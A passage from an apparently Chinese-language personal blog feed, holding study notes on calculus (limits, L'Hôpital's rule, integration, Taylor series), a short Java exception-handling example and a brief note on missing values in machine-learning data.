</li></ul><p><strong>隐函数求导的含义</strong></p><ul>  <li>    <p>从纯数学的角度看，示例 1 与示例 2 的做法没有区别。但是示例 2 求导时带有明确的物理意义——表达式随时间的变化率。但是求圆切线时似乎难以解释为什么这么做。</p>  </li>  <li>    <p>其实<strong>隐函数的导数也是一个隐函数</strong>，它对 <code>dx</code> 和 <code>dy</code> 的关系做了限制——在圆的例子上，它要求整体变化量 <code>dS = 2xdx + 2ydy</code> 为 0；也就是说为了让 <code>S = x^2 + y^2</code> 始终保持在 25，那么 <code>dS</code> 就需要为 0.</p>    <blockquote>      <p>严格来讲，这个条件实际上是保证每一步落在过该点的切线上，而不是落在圆本身。当 <code>dx</code> 和 <code>dy</code> 足够小时，这两者才没有区别。</p>      <p>在隐函数的导数中，原来的变量看做常数，比如这里 <code>2xdx + 2ydy = 0</code> 中的 <code>x</code> 和 <code>y</code></p>    </blockquote>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180628120153.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180628120634.png" alt=""></p>    <blockquote>      <p>显然，（左）的正体变化量就不满足使 S 保持不变</p>    </blockquote>  </li></ul><p><strong>示例 3：<code>sin(x)y^2 = x</code></strong></p><ul>  <li>    <p>该函数的图像是一系列 U 型曲线</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180628121250.png" alt=""></p>    <blockquote>      <p>有了这个等式，就能方便求出 <code>dy/dx</code> 了。</p>    </blockquote>  </li>  <li>    <p>对表达式的两边求导，就可以得到导数的隐函数，它对 <code>x</code> 和 <code>y</code> 的整体微小变化量作出了限制。</p>  </li></ul><p><strong>示例 4：<code>ln(x)</code>的导数——从已有的导函数推算出其他函数的导函数</strong></p><ul>  <li>    <p>根据指数函数与对数函数的关系，有</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180628141926.png" alt=""></p>  </li></ul><p><strong>多元微积分</strong></p><ul>  <li>隐函数求导是<strong>多元微积分</strong>的入门。两者的要点是一样的，需要理解这多个变量是如何联系在一起变化的。</li></ul><h1>7. 极限</h1><p>简单来说，“极限”就是逼近/趋近更“洋气”的说法。</p><h2 id="7-1-导数的正式定义">7.1. 导数的正式定义</h2><ul>  <li>    <p>导数的计算公式：</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180628143525.png" alt=""></p>    <p>导数的正式定义：</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180628144611.png" alt=""></p>    <p>或</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180628144731.png" alt=""></p>    <blockquote>      <p>为什么不用 <code>dx</code>？——<code>dx</code> 本身已经表达了求极限的含义——使用 <code>dx</code> 的表示容易将其理解成“无穷小的变化量”；<strong>更正确的</strong>解读应该是把它看做一个具体的、有限小的变化量，并时刻考虑 <code>dx → 0</code> 时的情况。</p>      <p>为什么用一个新的变量 <code>h</code>？——明确变化量 <code>h</code> 只是一个普通的数，跟“无穷小”没有任何关系。</p>    </blockquote>  </li></ul><h2 id="7-2-极限的-ϵ-δ-定义">7.2. 极限的 <code>(ϵ, δ)</code> 定义</h2><p>所谓极限，指的是变量逼近 0 时的影响，而非无穷小变量的影响</p><p>导数由极限定义，而极限本身由 <code>(ϵ, δ)</code> 定义，下面是比较书面的说法：</p><blockquote>  <p>设函数<code>f(x)</code>在点<code>x0</code>的某一<strong>去心邻域</strong>内有定义，如果存在常数<code>a</code>，对于任意给定的正数<code>ϵ</code>，都<code>∃δ&gt;0</code>，使不等式<code>|f(x)-a| &lt; ϵ</code>在<code>|x-x0| ∈ (0,δ)</code>恒成立，那么<code>a</code>就叫做函数<code>f(x)</code>当<code>x→x0</code>时的极限，记作</p>  <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180628200345.png" alt=""></p></blockquote><p><strong>极限存在与不存在的两个例子</strong></p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180628201027.png" alt="">  <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180628201344.png" alt=""></p><blockquote>  <p>极限存在的前提是，你总能在距离极限点<code>x0</code>距离为<code>δ(&gt;0)</code>的取值范围内，找到一系列取值点，使得范围内的任一取值点，它的函数值都在距离<code>f(x0)</code>为<code>ϵ(&gt;0)</code>的范围内——关键在于这种情况对于任意<code>ϵ</code>都成立——无论<code>ϵ</code>多小，你总能找到与之对应的<code>δ</code></p></blockquote><h2 id="7-3-利用导数来求极限-洛必达法则">7.3. 利用导数来求极限——洛必达法则</h2><p>如果函数在点<code>x0</code>处是有定义的，那么该点的极限值 == 函数值本身。</p><p>如果函数在该点没有定义呢？比如 <code>sin(πx)/(x^2-1)</code>，该函数在<code>x0=±1</code>处就没有定义。</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180628203925.png" alt=""></p><p><strong>洛必达法则</strong></p><ul>  <li>    <p>洛必达法则专门用于求解 <code>0/0</code> 型和 <code>∞/∞</code> 的极限值。</p>  </li>  <li>    <p>导数是由极限定义的，但反过来，也能利用导数来求极限</p>  </li>  <li>    <p>洛必达法则利用了这样一个性质——当<code>f(a)=0</code>时，在<code>a</code>的附近，有<code>f(a+dx)=f'(a+dx)</code>。如图所示：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180628211047.png" alt=""></p>    <blockquote>      <p>当 <code>dx</code> 越小，这个比值就越精确</p>    </blockquote>  </li>  <li>    <p>洛必达法则：</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180628210652.png" alt=""></p>    <blockquote>      <p>条件：1）<code>f(x)</code>和<code>g(x)</code>在点<code>a</code>处的极限都为 0；2）<code>f(x)</code>和<code>g(x)</code>在点<code>a</code>的某去心领域内可导，且<code>g'(x)!=0</code>；3）<code>A</code>可以为实数，也可以为<code>±∞</code></p>      <p>注意，只要满足以上条件，洛必达法则是可以继续进行的</p>    </blockquote>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180628211807.png" alt=""></p>  </li>  <li>    <p>这么看，实际上，求解导数的过程也是在使用洛必达法则</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180628144731.png" alt=""></p>    <blockquote>      <p>分子分母在 <code>h→0</code> 处的极限都为 <code>0</code></p>    </blockquote>  </li></ul><h1>8. 积分与微积分基本定理</h1><p>积分其实就是求导的逆运算</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629094906.png" alt=""></p><p><strong>示例：距离是速度对时间的积分</strong></p><ul>  <li>    <p>已知速度-时间的关系 <code>v(t)=t(8-t)</code>，求这段时间驶过的距离。</p>  </li>  <li>    <p>现在“已知每个时间点的速度 <code>v(t)</code>，来求距离<code>s(t)</code>”</p>  </li>  <li>    <p>从数学的角度，前者的问题等价于求“<code>s(t)</code>的导数”，于是现在的问题也就是求“哪个函数的导数是<code>v(t)</code>”——这通常被称为“求函数的‘<strong>原函数</strong>’（或‘反导数’）”</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629100103.png" alt=""></p>  </li>  <li>    <p>这个问题可以转化成求解曲线下方的面积</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629101348.png" alt=""></p>  </li>  <li>    <p>这个过程可以表示为 <code>v(t)</code> 的“积分”：</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629102412.png" alt=""></p>    <blockquote>      <p>为什么不适用<code>∑</code>？——<code>∫</code>指的并不是具体的<code>dt</code>的加和，而是当<code>dt→0</code>时，加和逼近的值，这个逼近的值就是曲线下方的面积；当<code>dt</code>越趋近 0，加和就越趋近精确解。</p>      <p>积分的含义就是将所有小量“累积”在一起</p>    </blockquote>  </li>  <li>    <p>“求函数图像与横轴围成的面积”是许多不相干问题的共通之处——可以被拆成小量，然后近似为这些小量的和</p>  </li></ul><h2 id="8-1-积分与导数是一组互逆的运算">8.1. 积分与导数是一组互逆的运算</h2><ul>  <li>根据以上的分析，距离实际上是速度对时间的积分，而速度是距离对时间的导数——这表明<strong>积分与导数是一组互逆的运算</strong></li></ul><p><strong>面积函数的导数等于函数本身</strong></p><ul>  <li>    <p>如果固定左端点，将右端点当做一个变量 <code>T</code>，那么这个积分可以看做以<strong>上限为自变量</strong>的函数 <code>s(T)</code>——这是距离关于时间的导数，同时也是图形下方的<strong>面积函数</strong></p>  </li>  <li>    <p>这表明任一<strong>函数图像下方面积函数的导函数等于该函数本身</strong></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629150107.png" alt=""></p>    <!-- > `v(t)` 图像下方的面积就代表 `T` 秒后经过的路程 -->    <ul>      <li>        <p><strong>从几何的角度看</strong>，矩形的面积为 <code>ds</code>，宽为 <code>dT</code>，它的高为 <code>v(T)</code>，于是有 <code>ds/dT = v(T)</code></p>      </li>      <li>        <p>即<strong>图像所表示的函数就是面积函数的导数</strong></p>      </li>    </ul>  </li>  <li>    <p>因此，求解积分的过程就是求导的<strong>逆过程</strong></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629150441.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629150541.png" alt="">      <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629151001.png" alt=""></p>  </li></ul><p><strong>每个函数都有无数个原函数</strong></p><ul>  <li>    <p>因为常数的导数为 0，所以在原函数的基础上加上任意常数，其导数不变——这意味着每个函数的原函数有无数个</p>  </li>  <li>    <p>所以<code>v(t) = 8t - t^2</code>正确的原函数应该是</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180629153014.png" alt=""></p>  </li>  <li>    <p>从图像上来看，曲线上下移动并不会影响其在每一点的斜率</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629152708.png" alt=""></p>  </li>  <li>    <p>在不同的问题中，一般会有额外的条件帮你决定该使用哪个原函数</p>    <ul>      <li>比如，在本问题中，<code>t=0</code> 时，<code>s(t)=0</code>，于是 <code>C=0</code></li>    </ul>  </li></ul><h2 id="8-2-微积分基本定理">8.2. 微积分基本定理</h2><ul>  <li>    <p>在对任意函数求（定）积分时，你是在对 <code>x</code> 在<strong>一定范围内</strong>的所有 <code>f(x)*dx</code> 求和，而积分值就是 <code>dx → 0</code> 时，这个和趋近的值。</p>  </li>  <li>    <p>求积分的第一步是找出原函数 <code>F</code>，使其导数为积分内的函数。</p>  </li>  <li>    <p>积分值就等于原函数在上限时的值减去其在下限时的值。</p>  </li>  <li>    <p>这个过程就是“微积分基本定理”</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629153515.png" alt=""></p>  </li>  <li>    <p>积分异于常识的一点在于：它<strong>连续地</strong>遍历了从下限到上限中的每一个自变量的值，而我们在利用原函数求值时，只需要关注上限与下限两个自变量</p>  </li></ul><p><strong>负面积</strong></p><ul>  <li>    <p>如果图像有部分出现在横轴的下方，那么这部分就是<strong>负面积</strong></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629160418.png" alt=""></p>    <blockquote>      <p>有符号的面积</p>    </blockquote>  </li>  <li>    <p>积分计算的不是真正的面积，而是图像与横轴围城的带有正负的面积。</p>  </li></ul><h1>9. 连续变量的平均值</h1><p>结论：<strong>区间上的平均斜率等于起点和终点连线的斜率</strong></p><p><strong>如何求连续变量的平均值？</strong></p><ul>  <li>    <p>问题等价于求图像下方面积的平均高度</p>  </li>  <li>    <p>如果把面积作为一个整体来看，这是一个很简单的问题——<code>平均高度 = 积分面积 / 上下限宽度</code></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629193011.png" alt=""></p>  </li>  <li>    <p>值得注意的是，<code>(F(b)-F(a))/(b-a)</code> 实际上也是原函数<code>F(x)</code>在 <code>x=a</code> 和 <code>x=b</code> 两点连线的斜率</p>  </li>  <li>    <p>这表明在某一区间上所有点处切线的<strong>平均斜率</strong>等于起点和终点连线的斜率</p>    <blockquote>      <p>根据定义，<code>f(x)</code>是其原函数<code>F(x)</code>的导函数，也就是说它给出了<code>F(x)</code>在每个点上切线的斜率，所以<code>f(x)</code>在<code>(a,b)</code>上的平均值也就是原函数从<code>x=a</code>到<code>x=b</code>上所有切线斜率的平均值。</p>    </blockquote>  </li>  <li>    <p>换言之，求解连续函数的平均值，可以转化为求解其原函数在各点切线的平均斜率；而两点间的平均斜率等于这两点的斜率。</p>  </li></ul><h2 id="9-1-适用-积分-的场景">9.1. 适用“积分”的场景</h2><ul>  <li>可以通过细分然后相加的方式进行估算时</li>  <li>求解连续变量的均值时（特别在概率中）</li></ul><h1>10. 泰勒级数</h1><h2 id="10-1-高阶导数">10.1. 高阶导数</h2><p>这里介绍高阶导数的目的是帮助得到函数的近似——泰勒级数</p><p><strong>二阶导数描述的是曲线的弯曲程度</strong></p><ul>  <li>    <p>根据导数的定义，二阶导数也就是导数的微小变化率，即斜率的变化率——直观来看，也就是<strong>曲线的弯曲程度</strong></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629210933.png" alt=""></p>    <ul>      <li>考虑函数的一个取值 <code>x</code>，然后向右连续的增加两个小量 <code>dx</code></li>      <li>第一个增量是函数产生了第一个变化量 <code>df1</code>，第二个同理，记 <code>df2</code></li>      <li>这两个变化量的差也就是<strong>函数值变化量的变化量</strong>，记 <code>d(df)</code>. 它和 <code>(dx)^2</code> 成正比</li>      <li>所谓二阶导数，就是 <code>d(df)</code> 和 <code>(dx)^2</code> 当 <code>dx → 0</code> 时比值的极限</li>    </ul>  </li>  <li>    <p>用符号表示为</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180629211135.png" alt=""></p>    <blockquote>      <p>其实中间的写法才是最正确的，但为了书写方便，通常写成最右侧的形式</p>    </blockquote>  </li>  <li>    <p>一个理解二阶导数的现实示例就是加速度</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180629211550.png" alt=""></p>    <blockquote>      <p>二阶导数为正，说明车在加速；反之，为负，说明在减速</p>    </blockquote>  </li></ul><h2 id="10-2-泰勒多项式与泰勒级数">10.2. 泰勒多项式与泰勒级数</h2><p>泰勒级数的作用——函数近似工具。比如，在 <code>x=0</code> 附近，有：</p><p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630094515.png" alt="">  <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630094555.png" alt="">  <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630094715.png" alt="">  <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630094826.png" alt=""></p><p>泰勒级数利用<strong>多项式函数</strong>去近似复杂抽象的函数，从而化简问题</p><ul>  <li>多项式函数的优势：易计算、易求导、易积分</li>  <li>深度学习中的梯度下降（一阶）、牛顿法（二阶）也是利用的泰勒级数</li></ul><p><strong>示例：<code>cos(x)</code> 在 <code>x=0</code> 附近如何用二次多项式近似？</strong></p><ul>  <li>    <p>问题等价于在所有可能的 <code>c0 + c1*x + c2*x^2</code> 中确定系数使其在 <code>x=0</code> 附近最近似 <code>cos(x)</code></p>  </li>  <li>    <p>不考虑任何先验知识，看看只凭直觉应该怎么确定这三个系数</p>    <ul>      <li>        <p>首先，<code>cos(x)</code> 在 <code>x=0</code> 处等于 1，那么至少多项式这一点要满足，即 <code>c0=1</code></p>      </li>      <li>        <p>如果多项式在 <code>x=0</code> 处切线的斜率也与 <code>cos(x)</code> 相同，那么近似程度应该会更高，于是 <code>c1=0</code></p>      </li>      <li>        <p>二阶导数描述的是曲线的弯曲程度，那么让两个图像在 <code>x=0</code> 处的弯曲程度相同应该会更近似，<code>cos(x)</code> 的二阶导是 <code>-cos(x)</code>，于是 <code>2c2=-cos(0)=-1 -&gt; c2=-1/2</code></p>      </li>      <li>        <p>还可以用更高次的多项式去近似，比如</p>        <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630110837.png" alt=""></p>      </li>      <li>        <p>在非 0 点，有类似的结果，如 <code>x=π</code></p>        <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630113240.png" alt=""></p>        <blockquote>          <p>带入 <code>x=π</code> 就能消去所有无关项</p>        </blockquote>      </li>    </ul>  </li>  <li>    <p>“<strong>泰勒多项式</strong>”小结</p>    <ul>      <li>        <p>在对高阶多项式求导时，自然而然的出现了<strong>阶乘</strong>的形式</p>      </li>      <li>        <p>当然，真正的系数需要除以这个阶乘</p>        <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630111742.png" alt=""></p>      </li>      <li>        <p>在向近似多项式中添加更高次的项时，不会影响低次项</p>      </li>      <li>        <p>因此，多项式任意 n 阶的导数在 <code>x=0</code> 时的值都由唯一的系数控制</p>        <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630113040.png" alt=""></p>      </li>      <li>        <p>这样的多项式就称为“泰勒多项式”</p>      </li>    </ul>  </li></ul><p><strong>泰勒多项式</strong>的本质</p><p>泰勒多项式实际上是利用函数在某点处的高阶导数，来近似该点附近的函数值</p><p>宏观来讲：泰勒级数把某一点处高阶导数的信息转化成了在那一点<strong>附近</strong>的函数值信息</p><ul>  <li>    <p><code>x=0</code> 时，它的常数项能让它与 <code>f(0)</code> 的值相等</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630153013.png" alt=""></p>  </li>  <li>    <p>它的一次项让两者的斜率相等</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630153808.png" alt=""></p>  </li>  <li>    <p>二次项让两者斜率的变化率相同</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630153907.png" alt=""></p>  </li>  <li>    <p>以此类推，项数越多，近似就越精确</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630154029.png" alt=""></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630154212.png" alt=""></p>  </li></ul><p><strong>从几何角度看二阶泰勒多项式</strong></p><ul>  <li>    <p>考虑如何近似曲线下的面积函数 <code>f_area(x)</code></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630194836.png" alt=""></p>    <ul>      <li>当 <code>dx → 0</code> 时，我们可以将增长的部分近似为矩形</li>      <li>但如果想将面积的变化近似得更准确，就需要考虑那块<strong>近似三角形</strong>的部分</li>    </ul>  </li>  <li>    <p>假设已知面积函数 <code>f</code> 在 <code>a</code> 点的导数信息，想要近似在 <code>x</code> 时的面积</p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630201849.png" alt=""></p>    <blockquote>      <p>三角形的高 = <code>斜率 * 底</code>，斜率 = 曲线在 a 点的导数 = <code>f''(a)</code></p>    </blockquote>  </li></ul><p><strong>任意函数的泰勒多项式</strong></p><ul>  <li>    <p>函数<code>f(x)</code>在<code>x=0</code>处的泰勒多项式</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180630152255.png" alt=""></p>  </li>  <li>    <p>函数<code>f(x)</code>在<code>x=a</code>处的泰勒多项式</p>    <p><img src="http://www.meng.uno/images/assets/%E5%85%AC%E5%BC%8F_20180630152454.png" alt=""></p>  </li></ul><p><strong>级数的概念</strong></p><p><strong>级数（series）的定义</strong>——无限项的和</p><ul>  <li>当泰勒多项式无限累加下去，就成了泰勒级数</li></ul><p><strong>级数的一些重要概念</strong></p><ul>  <li>    <p><strong>级数的收敛（Converges）与发散（diverges）、收敛半径</strong></p>    <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630202744.png" alt=""></p>    <blockquote>      <p>无限累加下去的和就“等于”级数收敛到的值；这里 <code>x=1</code></p>    </blockquote>    <ul>      <li>        <p>一些级数无论你带入什么值，它的级数都会收敛，比如 <code>e^x</code> 在 <code>x=0</code> 处的泰勒级数</p>        <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630203750.png" alt="">          <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630203959.png" alt=""></p>        <blockquote>          <p>无论 <code>x</code> 取何值，<code>e^x</code> 都等于该泰勒级数</p>        </blockquote>      </li>      <li>        <p>但有些级数就只会在一定取值范围内才会收敛，比如 <code>ln(x)</code> 在 <code>x=1</code> 处的泰勒级数</p>        <p><img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630204148.png" alt="">          <img src="http://www.meng.uno/images/assets/TIM%E6%88%AA%E5%9B%BE20180630204303.png" alt=""></p>        <ul>          <li>只有当 <code>x∈(0,2]</code>时，该级数才会收敛</li>          <li>换言之，在 <code>x=1</code> 处取得的导数信息无法拓展到更广的取值范围</li>          <li>这个泰勒级数的<strong>收敛半径</strong>为 <code>1</code>，即<code>x∈(0, 2]</code></li>        </ul>      </li>    </ul>  </li></ul><p><strong>常见的泰勒级数</strong></p><blockquote>  <p>泰勒级数_百度百科 <a href="https://baike.baidu.com/item/%E6%B3%B0%E5%8B%92%E7%BA%A7%E6%95%B0/7289427?fr=aladdin#6" target="_blank" rel="noopener">https://baike.baidu.com/item/泰勒级数/7289427?fr=aladdin#6</a></p></blockquote><p><strong>泰勒级数的更多内容</strong></p><ul>  <li>拉格朗日余项</li>  <li>判断级数收敛——审敛法</li>  <li>求收敛半径</li>  <li>…</li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/93227351/">http://home.meng.uno/articles/93227351/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      1. 微积分（Calculus）引言
微积分回忆

 * 求导公式
 * 乘积法则
 * 链式法则
 * 隐函数求导
 * 积分、微分的互逆关系
 * 泰勒级数
 * …

微积分的三个中心思想：

 1. 积分
 2. 微分
 3. 积分与微分（导数）的互逆

（几位）微积分之父

 * 发现微积分：巴罗（Barrow）、牛顿（Newton）、莱布尼茨（Leibniz）
 * 给出严格定义：柯西（Cauchy）、魏尔施特拉斯（Weierstrass）

1.1. 推导圆的面积 - 积分的直观理解
圆的面积公式：



如何从积分的角度推导出圆的面积公式？

不同的划分方法会带来不同的积分公式
    
    </summary>
    
      <category term="Mathematical Modeling" scheme="http://home.meng.uno/categories/Mathematical-Modeling/"/>
    
    
      <category term="微积分" scheme="http://home.meng.uno/tags/%E5%BE%AE%E7%A7%AF%E5%88%86/"/>
    
      <category term="数学" scheme="http://home.meng.uno/tags/%E6%95%B0%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Java异常处理</title>
    <link href="http://home.meng.uno/articles/7526d370/"/>
    <id>http://home.meng.uno/articles/7526d370/</id>
    <published>2018-02-01T14:21:52.000Z</published>
    <updated>2020-12-02T01:49:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>在Java中，调用某方法，就必须处理被调用方法抛出的异常，同时超类也可以用来捕获或者处理子类异常。</p><h2 id="调用方法必须处理被调用方法抛出的异常">调用方法必须处理被调用方法抛出的异常</h2><p>下面是一个处理异常的程序。我们可以测试一下，如果在一个方法中抛出一个异常，不仅是该方法，而且所有调用该方法的方法都必须声明或抛出异常。</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exceptionTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Exception exception;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            callDoOne(); </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doOne</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> exception;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">callDoOne</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        doOne();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="超类可以用来捕获或处理子类异常">超类可以用来捕获或处理子类异常</h2><p>可以使用如下代码验证。</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">myException</span> <span class="keyword">extends</span> <span class="title">Exception</span></span>&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exceptionTest</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Exception exception;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> myException myexception;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            callDoOne(); </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doOne</span><span class="params">()</span> <span class="keyword">throws</span> myException </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> myexception;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">callDoOne</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        doOne();</span><br><span class="line">        <span class="keyword">throw</span> exception;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>这也就是为什么catch子句只有一个父类在语法上安全的原因。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/7526d370/">http://home.meng.uno/articles/7526d370/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      在Java中，调用某方法，就必须处理被调用方法抛出的异常，同时超类也可以用来捕获或者处理子类异常。

调用方法必须处理被调用方法抛出的异常
下面是一个处理异常的程序。我们可以测试一下，如果在一个方法中抛出一个异常，不仅是该方法，而且所有调用该方法的方法都必须声明或抛出异常。

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15


public class exceptionTest {
    private static Exception exception;
 
    public static void main(String[] args) throws Ex
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="Java" scheme="http://home.meng.uno/tags/Java/"/>
    
      <category term="Exception" scheme="http://home.meng.uno/tags/Exception/"/>
    
  </entry>
  
  <entry>
    <title>怎么处理噪声</title>
    <link href="http://home.meng.uno/articles/a12d1477/"/>
    <id>http://home.meng.uno/articles/a12d1477/</id>
    <published>2018-01-27T14:35:33.000Z</published>
    <updated>2020-12-02T01:48:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>处理噪声是一个在机器学习学习过程中，总会被问到的问题。噪声可以出现在输入<code>X</code>，亦可以出现在输出<code>Y</code>中。</p><h2 id="x中缺失值"><code>X</code>中缺失值</h2><ol>  <li>使用来自所有可用数据的特征的平均值</li>  <li>忽略实例</li>  <li>使用来自类似项目的平均值</li>  <li>使用另一个机器学习算法来预测值</li></ol><ul>  <li>Bagging 或者 Boosting</li></ul><p><br><br>本文链接： <a href="http://home.meng.uno/articles/a12d1477/">http://home.meng.uno/articles/a12d1477/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      处理噪声是一个在机器学习学习过程中，总会被问到的问题。噪声可以出现在输入X，亦可以出现在输出Y中。

X中缺失值
 1. 使用来自所有可用数据的特征的平均值
 2. 忽略实例
 3. 使用来自类似项目的平均值
 4. 使用另一个机器学习算法来预测值

 * Bagging 或者 Boosting



本文链接： http://home.meng.uno/articles/a12d1477/ 欢迎转载！
    
    </summary>
    
